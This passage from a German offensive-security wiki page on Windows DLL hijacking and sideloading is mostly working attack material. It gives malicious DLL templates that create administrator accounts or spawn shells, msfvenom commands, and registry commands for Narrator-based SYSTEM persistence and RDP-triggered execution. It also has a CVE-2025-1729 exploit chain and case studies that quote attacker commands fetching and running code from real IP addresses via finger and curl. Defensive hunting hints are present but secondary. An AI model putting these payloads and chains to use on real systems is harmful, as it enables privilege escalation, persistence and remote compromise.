**Einen Benutzer erstellen (x86, ich habe keine x64-Version gesehen):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Deine eigene

In vielen Fällen muss die DLL, die du kompilierst, **jede vom Opferprozess importierte Funktion exportieren**. Wenn ein erforderlicher Export fehlt, kann die Binärdatei ihn nicht auflösen und der Exploit schlägt fehl.

<details>
<summary>C-DLL-Vorlage (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-Beispiel mit Benutzererstellung</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<summary>Alternative C-DLL mit Thread-Einstiegspunkt</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Fallstudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe prüft beim Start weiterhin eine vorhersehbare, sprachspezifische Localization DLL, die für beliebige Codeausführung und Persistenz hijacked werden kann.<sup>[[7]](#references)</sup>

Wichtige Fakten
- Probe-Pfad (aktuelle Builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy-Pfad (ältere Builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Wenn am OneCore-Pfad eine beschreibbare, vom Angreifer kontrollierte DLL vorhanden ist, wird sie geladen und `DllMain(DLL_PROCESS_ATTACH)` ausgeführt. Es sind keine Exports erforderlich.

Discovery mit Procmon
- Filter: `Process Name is Narrator.exe` und `Operation is Load Image` oder `CreateFile`.
- Narrator starten und den versuchten Load des oben genannten Pfads beobachten.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Ein naiver Hijack würde die Benutzeroberfläche aktivieren/hervorheben. Um unauffällig zu bleiben, beim Attach die Narrator-Threads enumerieren, den Haupt-Thread (`OpenThread(THREAD_SUSPEND_RESUME)`) öffnen und mit `SuspendThread` anhalten; in dem eigenen Thread fortfahren. Siehe PoC für den vollständigen Code.<sup>[[8]](#references)</sup>

Trigger und Persistenz über die Accessibility-Konfiguration
- Benutzerkontext (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Mit den obigen Einstellungen lädt das Starten von Narrator die platzierte DLL. Drücke auf dem sicheren Desktop (Anmeldebildschirm) CTRL+WIN+ENTER, um Narrator zu starten; deine DLL wird als SYSTEM auf dem sicheren Desktop ausgeführt.

Durch RDP ausgelöste SYSTEM-Ausführung (laterale Bewegung)
- Klassische RDP-Sicherheitsschicht erlauben: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Per RDP eine Verbindung zum Host herstellen und am Anmeldebildschirm CTRL+WIN+ENTER drücken, um Narrator zu starten; deine DLL wird als SYSTEM auf dem sicheren Desktop ausgeführt.
- Die Ausführung endet, sobald die RDP-Sitzung geschlossen wird – daher umgehend injecten/migrieren.

Bring Your Own Accessibility (BYOA)
- Du kannst einen Registry-Eintrag eines integrierten Accessibility Tools (AT) klonen (z. B. CursorIndicator), ihn so bearbeiten, dass er auf eine beliebige Binary/DLL zeigt, ihn importieren und anschließend `configuration` auf den Namen dieses AT setzen. Dadurch wird beliebige Ausführung unter dem Accessibility-Framework vermittelt.

Hinweise
- Das Schreiben unter `%windir%\System32` und das Ändern von HKLM-Werten erfordern Administratorrechte.
- Die gesamte Payload-Logik kann in `DLL_PROCESS_ATTACH` enthalten sein; Exports sind nicht erforderlich.

## Fallstudie: CVE-2025-1729 – Privilege Escalation mit TPQMAssistant.exe

Dieser Fall demonstriert **Phantom DLL Hijacking** im Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), das als **CVE-2025-1729** erfasst ist.<sup>[[2]](#references)[[3]](#references)</sup>

### Details zur Schwachstelle

- **Komponente**: `TPQMAssistant.exe`, gespeichert unter `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geplante Aufgabe**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` wird täglich um 9:30 Uhr im Kontext des angemeldeten Benutzers ausgeführt.
- **Berechtigungen des Verzeichnisses**: Für `CREATOR OWNER` beschreibbar, wodurch lokale Benutzer beliebige Dateien ablegen können.
- **DLL-Suchverhalten**: Versucht zunächst, `hostfxr.dll` aus seinem Arbeitsverzeichnis zu laden, und protokolliert „NAME NOT FOUND“, wenn die Datei fehlt, was auf eine Vorrangigkeit der lokalen Verzeichnissuche hinweist.

### Exploit-Implementierung

Ein Angreifer kann einen schädlichen `hostfxr.dll`-Stub im selben Verzeichnis ablegen und die fehlende DLL ausnutzen, um Codeausführung im Kontext des Benutzers zu erreichen:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Angriffsablauf

1. Lege als Standardbenutzer `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\` ab.
2. Warte, bis die geplante Aufgabe um 9:30 Uhr im Kontext des aktuellen Benutzers ausgeführt wird.
3. Wenn bei der Ausführung der Aufgabe ein Administrator angemeldet ist, wird die bösartige DLL in der Sitzung des Administrators mit mittlerer Integrität ausgeführt.
4. Verknüpfe standardmäßige UAC bypass techniques, um von mittlerer Integrität zu SYSTEM-Rechten zu gelangen.

## Fallstudie: MSI CustomAction Dropper + DLL Side-Loading über einen signierten Host (wsc_proxy.exe)

Threat actors kombinieren häufig MSI-basierte droppers mit DLL side-loading, um payloads unter einem vertrauenswürdigen, signierten Prozess auszuführen.<sup>[[10]](#references)</sup>

Übersicht der Kette
- Der Benutzer lädt eine MSI-Datei herunter. Eine CustomAction wird während der GUI-Installation still ausgeführt (z. B. eine LaunchApplication- oder VBScript-Aktion) und rekonstruiert die nächste Stufe aus eingebetteten Ressourcen.
- Der dropper schreibt eine legitime, signierte EXE und eine bösartige DLL in dasselbe Verzeichnis (Beispielpaar: von Avast signierte wsc_proxy.exe + vom Angreifer kontrollierte wsc.dll).
- Beim Start der signierten EXE lädt die Windows-DLL-Suchreihenfolge zuerst wsc.dll aus dem Arbeitsverzeichnis und führt dadurch Angreifercode unter einem signierten Parent aus (ATT&CK T1574.001).

MSI-Analyse (worauf zu achten ist)
- CustomAction-Tabelle:
- Suche nach Einträgen, die ausführbare Dateien oder VBScript ausführen. Verdächtiges Beispielmuster: LaunchApplication führt eine eingebettete Datei im Hintergrund aus.
- Untersuche in Orca (Microsoft Orca.exe) die Tabellen CustomAction, InstallExecuteSequence und Binary.
- Eingebettete/geteilte payloads im MSI-CAB:
- Administrative Extraktion: msiexec /a package.msi /qb TARGETDIR=C:\out
- Oder verwende lessmsi: lessmsi x package.msi C:\out
- Suche nach mehreren kleinen Fragmenten, die von einer VBScript-CustomAction verkettet und entschlüsselt werden. Häufiger Ablauf:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktisches Sideloading mit wsc_proxy.exe
- Lege diese beiden Dateien im selben Ordner ab:
- wsc_proxy.exe: legitimer signierter Host (Avast). Der Prozess versucht, wsc.dll anhand ihres Namens aus seinem Verzeichnis zu laden.
- wsc.dll: Angreifer-DLL. Wenn keine spezifischen Exporte erforderlich sind, kann DllMain ausreichen. Andernfalls erstelle eine Proxy-DLL und leite die erforderlichen Exporte an die echte Bibliothek weiter, während der Payload in DllMain ausgeführt wird.
- Erstelle einen minimalen DLL-Payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Für Export-Anforderungen sollte ein Proxying-Framework (z. B. DLLirant/Spartacus) verwendet werden, um eine Forwarding-DLL zu erzeugen, die zusätzlich den Payload ausführt.

- Diese Technik basiert auf der DLL-Namensauflösung durch die Host-Binary. Wenn der Host absolute Pfade oder Safe-Loading-Flags verwendet (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann der Hijack fehlschlagen.
- KnownDLLs, SxS und weitergeleitete Exports können die Priorität beeinflussen und müssen bei der Auswahl der Host-Binary und des Export-Sets berücksichtigt werden.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point beschrieb, wie Ink Dragon ShadowPad mithilfe einer **Drei-Dateien-Triade** bereitstellt, um sich in legitime Software einzufügen und gleichzeitig den zentralen Payload auf dem Datenträger verschlüsselt zu halten:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – Anbieter wie AMD, Realtek oder NVIDIA werden missbraucht (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die Angreifer benennen die ausführbare Datei um, damit sie wie eine Windows-Binary aussieht (z. B. `conhost.exe`), während die Authenticode-Signatur gültig bleibt.
2. **Malicious loader DLL** – Sie wird mit dem erwarteten Namen neben der EXE abgelegt (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL ist normalerweise eine mit dem ScatterBrain-Framework obfuskierte MFC-Binary; ihre einzige Aufgabe besteht darin, den verschlüsselten Blob zu finden, ihn zu entschlüsseln und ShadowPad reflectively zu mappen.
3. **Encrypted payload blob** – Er wird häufig als `<name>.tmp` im selben Verzeichnis gespeichert. Nach dem Memory-Mapping des entschlüsselten Payloads löscht der Loader die TMP-Datei, um forensische Beweise zu vernichten.

Tradecraft-Hinweise:

* Das Umbenennen der Signed EXE (während der ursprüngliche `OriginalFileName` im PE-Header erhalten bleibt) ermöglicht es, sie als Windows-Binary zu tarnen und gleichzeitig die Signatur des Anbieters beizubehalten. Daher sollte das Vorgehen von Ink Dragon nachgeahmt werden, indem `conhost.exe`-ähnliche Binaries abgelegt werden, die tatsächlich AMD/NVIDIA-Utilities sind.
* Da die ausführbare Datei vertrauenswürdig bleibt, müssen die meisten Allowlisting-Kontrollen lediglich berücksichtigen, dass die Malicious DLL neben ihr liegt. Der Schwerpunkt sollte auf der Anpassung der Loader-DLL liegen; der Signed Parent kann normalerweise unverändert ausgeführt werden.
* ShadowPads Decryptor erwartet, dass der TMP-Blob neben dem Loader liegt und beschreibbar ist, damit die Datei nach dem Mapping auf null gesetzt werden kann. Das Verzeichnis sollte bis zum Laden des Payloads beschreibbar bleiben; sobald er sich im Speicher befindet, kann die TMP-Datei für OPSEC sicher gelöscht werden.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators kombinieren DLL sideloading mit LOLBAS, sodass das einzige benutzerdefinierte Artefakt auf dem Datenträger die Malicious DLL neben der Trusted EXE ist:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Verstecktes PowerShell startet `cmd.exe /c`, ruft Befehle von einem Finger-Server ab und leitet sie an `cmd` weiter:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` ruft Text über TCP/79 ab; `| cmd` führt die Serverantwort aus, sodass Operators den Second-Stage-Server serverseitig wechseln können.

- **Built-in download/extract:** Ein Archiv mit einer harmlosen Extension wird heruntergeladen, entpackt und das Sideload-Ziel zusammen mit der DLL unter einem zufälligen `%LocalAppData%`-Verzeichnis bereitgestellt:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` blendet den Fortschritt aus und folgt Redirects; `tar -xf` verwendet das in Windows integrierte tar.

- **WMI/CIM launch:** Die EXE wird über WMI gestartet, sodass die Telemetrie einen durch CIM erstellten Prozess anzeigt, während dieser die nebenliegende DLL lädt:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Dies funktioniert mit Binaries, die lokale DLLs bevorzugen (z. B. `intelbq.exe`, `nearby_share.exe`); der Payload (z. B. Remcos) läuft unter dem vertrauenswürdigen Namen.

- **Hunting:** Es sollte ein Alert für `forfiles` ausgelöst werden, wenn `/p`, `/m` und `/c` gemeinsam auftreten; außerhalb von Admin-Skripten ist dies ungewöhnlich.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Ein aktueller Lotus-Blossom-Einbruch missbrauchte eine vertrauenswürdige Update-Kette, um einen NSIS-gepackten Dropper bereitzustellen, der ein DLL sideloading sowie vollständig im Speicher ausgeführte Payloads vorbereitete.<sup>[[13]](#references)</sup>

Tradecraft-Ablauf
- `update.exe` (NSIS) erstellt `%AppData%\Bluetooth`, markiert es als **HIDDEN**, legt eine umbenannte Bitdefender Submission Wizard `BluetoothService.exe`, eine Malicious `log.dll` und einen verschlüsselten Blob `BluetoothService` ab und startet anschließend die EXE.
- Die Host-EXE importiert `log.dll` und ruft `LogInit`/`LogWrite` auf. `LogInit` lädt den Blob per mmap; `LogWrite` entschlüsselt ihn mit einem benutzerdefinierten LCG-basierten Stream (Konstanten **0x19660D** / **0x3C6EF35F**, aus einem vorherigen Hash abgeleitetes Schlüsselmaterial), überschreibt den Buffer mit Plaintext-Shellcode, gibt temporäre Daten frei und springt zu ihm.
- Um eine IAT zu vermeiden, löst der Loader APIs auf, indem er Export-Namen mit **FNV-1a basis 0x811C9DC5 + prime 0x100019** hasht, anschließend eine Murmur-artige Avalanche-Funktion (**0x85EBCA6B**) anwendet und die Ergebnisse mit gesalzenen Ziel-Hashes vergleicht.

Main shellcode (Chrysalis)
- Entschlüsselt ein PE-ähnliches Main Module, indem der Schlüssel `gQ2JR&9;` in fünf Durchläufen wiederholt addiert/XOR-verknüpft/subtrahiert wird, und lädt anschließend dynamisch `Kernel32.dll` → `GetProcAddress`, um die Importauflösung abzuschließen.
- Rekonstruiert DLL-Namensstrings zur Laufzeit mithilfe von Bit-Rotate/XOR-Transformationen pro Zeichen und lädt anschließend `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Verwendet einen zweiten Resolver, der die **PEB → InMemoryOrderModuleList** durchläuft, jede Export-Tabelle in 4-Byte-Blöcken mit Murmur-artigem Mixing parst und nur dann auf `GetProcAddress` zurückgreift, wenn der Hash nicht gefunden wird.

Embedded configuration & C2
- Die Config befindet sich innerhalb der abgelegten Datei `BluetoothService` bei **Offset 0x30808** (Größe **0x980**) und wird mit dem Schlüssel `qwhvb^435h&*7` per RC4 entschlüsselt, wodurch die C2-URL und der User-Agent offengelegt werden.
- Beacons erstellen ein durch Punkte getrenntes Host-Profil, stellen das Tag `4Q` voran und verschlüsseln es anschließend per RC4 mit dem Schlüssel `vAuig34%^325hGV`, bevor sie es über HTTPS an `HttpSendRequestA` übergeben. Responses werden per RC4 entschlüsselt und über einen Tag-Switch verarbeitet (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Der Execution Mode wird durch CLI-Argumente gesteuert: keine Argumente = Installation der Persistence (Service/Run key), die auf `-i` verweist; `-i` startet sich selbst mit `-k` erneut; `-k` überspringt die Installation und führt den Payload aus.

Alternate loader observed
- Beim selben Einbruch wurden der Tiny C Compiler abgelegt und `svchost.exe -nostdlib -run conf.c` aus `C:\ProgramData\USOShared\` ausgeführt, wobei `libtcc.dll` daneben lag. Der vom Angreifer bereitgestellte C-Source enthielt eingebetteten Shellcode, wurde kompiliert und im Speicher ausgeführt, ohne eine PE auf dem Datenträger abzulegen. Replizieren lässt sich dies mit:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Diese TCC-basierte Compile-and-run-Phase importierte `Wininet.dll` zur Laufzeit und rief einen Second-stage-Shellcode von einer fest codierten URL ab, wodurch ein flexibler Loader entstand, der sich als Compiler-Ausführung tarnt.

## Signed-host sideloading with export proxying + host thread parking

Einige DLL-sideloading-Ketten fügen **Stabilitätsoptimierung** hinzu, damit der legitime Host lange genug aktiv bleibt, um spätere Stages sauber zu laden, anstatt nach dem Laden der schädlichen DLL abzustürzen.<sup>[[11]](#references)</sup>

Beobachtetes Muster
- Eine vertrauenswürdige EXE neben einer schädlichen DLL unter Verwendung des erwarteten Dependency-Namens wie `version.dll` ablegen.
- Die schädliche DLL **proxyt jeden erwarteten Export** zurück an die echte System-DLL (zum Beispiel `%SystemRoot%\\System32\\version.dll`), sodass die Importauflösung weiterhin erfolgreich ist und der Host-Prozess funktionsfähig bleibt.
- Nach dem Laden **patcht die schädliche DLL den Entry Point des Hosts**, sodass der Main-Thread in eine endlose `Sleep`-Schleife fällt, anstatt zu beenden oder Codepfade auszuführen, die den Prozess terminieren würden.
- Ein neuer Thread führt die eigentliche schädliche Arbeit aus: den Namen oder Pfad der Next-stage-DLL entschlüsseln (RC4/XOR sind üblich) und sie anschließend mit `LoadLibrary` starten.

Warum das wichtig ist
- Normales DLL-Proxying erhält die API-Kompatibilität, garantiert jedoch nicht, dass der Host lange genug aktiv bleibt, damit spätere Stages geladen werden können.
- Den Main-Thread in `Sleep(INFINITE)` zu parken, ist eine einfache Möglichkeit, den signierten Prozess resident zu halten, während der Loader in einem Worker-Thread Entschlüsselung, Staging oder den Netzwerk-Bootstrap durchführt.
- Wer ausschließlich nach einem verdächtigen `DllMain` sucht, kann dieses Muster übersehen, wenn das interessante Verhalten erst nach dem Patchen des Host-Entry-Points und dem Start eines sekundären Threads auftritt.

Minimaler Workflow
1. Die signierte Host-EXE kopieren und die DLL bestimmen, die sie aus dem lokalen Verzeichnis auflöst.
2. Eine Proxy-DLL erstellen, die dieselben Funktionen exportiert und sie an die legitime DLL weiterleitet.
3. In `DllMain(DLL_PROCESS_ATTACH)` einen Worker-Thread erstellen.
4. Von diesem Thread aus den Host-Entry-Point oder die Start-Routine des Main-Threads patchen, sodass sie in einer `Sleep`-Schleife läuft.
5. Den Namen/die Konfiguration der Next-stage-DLL entschlüsseln und `LoadLibrary` aufrufen oder das Payload manuell mappen.

Defensive Ansatzpunkte
- Signierte Prozesse, die `version.dll` oder ähnlich verbreitete Bibliotheken aus ihrem eigenen Anwendungsverzeichnis statt aus `System32` laden.
- Speicher-Patches am Process-Entry-Point kurz nach dem Laden des Images, insbesondere Sprünge/Aufrufe, die zu `Sleep`/`SleepEx` umgeleitet werden.
- Von einer Proxy-DLL erstellte Threads, die unmittelbar `LoadLibrary` auf eine zweite DLL mit entschlüsseltem Namen aufrufen.
- Vollständige Export-Proxy-DLLs, die neben Vendor-Executables in beschreibbaren Staging-Verzeichnissen wie `ProgramData`, `%TEMP%` oder entpackten Archivpfaden platziert werden.

## References

- [1] [Red Canary – Intelligence Insights: Januar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 – Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store – TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL Hijacking in Windows. Einfaches C-Beispiel.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore setzt neue Malware gegen Europa ein](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Wenn DLL-Hijacks auf Windows-Hilfsprogramme treffen](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digitale Doppelgänger: Anatomie sich entwickelnder Impersonation-Kampagnen zur Verbreitung von Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Zusammenlaufende Interessen: Analyse von Bedrohungsclustern, die eine südostasiatische Regierung ins Visier nehmen](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Einblick in Ink Dragon: Das Relay-Netzwerk und die internen Abläufe einer verdeckten offensiven Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Die Chrysalis-Backdoor: Eine detaillierte Analyse des Toolkits von Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL-Hijack-Kette](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Verfolgung der Spionagekampagnen von Iranian APT Screening Serpens im Jahr 2026](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Nimbus-Manticore-Operationen während des iranischen Konflikts](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task-Aktionen](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 nimmt südostasiatische Regierungen und kritische Infrastruktur ins Visier](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
